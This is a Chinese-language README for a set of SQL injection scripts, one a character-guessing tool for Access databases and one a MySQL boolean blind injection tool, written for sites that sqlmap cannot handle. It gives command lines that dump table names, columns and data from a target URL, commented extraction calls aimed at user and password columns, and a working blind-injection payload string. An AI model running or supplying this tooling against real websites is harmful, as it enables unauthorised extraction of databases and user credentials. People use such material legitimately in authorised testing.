# 1.写这些脚本的目的

解决sqlmap不能跑的站点，并且手工注入又会消耗大量的时间和精力的情况。

# 2.用法

## 2.1 ACCESS-Injection

Blog ： http://admintony.com/2017/12/28/ACCESS%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%80%90%E5%AD%97%E7%8C%9C%E8%A7%A3%E6%B3%95-Python%E5%B7%A5%E5%85%B7/
```bash
python3 inj.py -u Url --tables --keyword=true_page_keyword [--thread=20] #爆表名,--thread参数可选，默认为10

python3 inj.py -u Url -T table_name --columns --keyword=true_page_keyword [--thread=20] #爆表名

python3 inj.py -u Url -T table_name -C col_name1,col_name2... --dump --keyword=keyword[--thread=20] #爆数据
```
## 2.2 MYSQL-Bind-injection

Blog ： http://admintony.com/2017/12/16/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B/

1>第一处
```python
#Target URL
url = "http://targetURL//index.php?a=index&f=ilist&p="
#keyword 用于判断页面是否正确
keyword ="keyword"
```
将代码开头的URL和keyword修改
2>第二处：需要使用什么功能就把什么功能的代码注释取消即可，至于该改的table_name,column_name自己改一下
```python
    info = Info()
    #注入当前数据库的用户
    #info.user()
    #注入数据库的版本
    #info.version()
    #注入当前数据库的名字
    #info.database()
    #注入表名
    #run()
    #注入列名
    run_column("shi_user")
    #注入数据
    #columnL = ["uid","pwd"]
    #run_value("pw_user",*columnL)```
    
3>爆列中数据的时候，列名请填写两个，在程序写死了，如果需要多个列名请修改第334行代码：

e.g.三个列
```python
payload = "-1 or ascii(substr((select concat(%s,0x7c,%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" \
% (self.column[0],self.column[1],self.column[2],self.table, self.i, x, n)
```
# 3.目录

```html
###########
├── Readme.md               // 帮助文档 
├── ACCESS-Injection        // ACCESS的逐字猜解法脚本
│   ├── injection.py        //主程序
│   ├── table.txt           //常用表名，来自sqlmap
│   ├── column.txt          //常用列名，来自sqlmap
├── MYSQL-Bind-injection    //mysql基于布尔盲注的脚本
│   ├── injection.py        //主程序

```
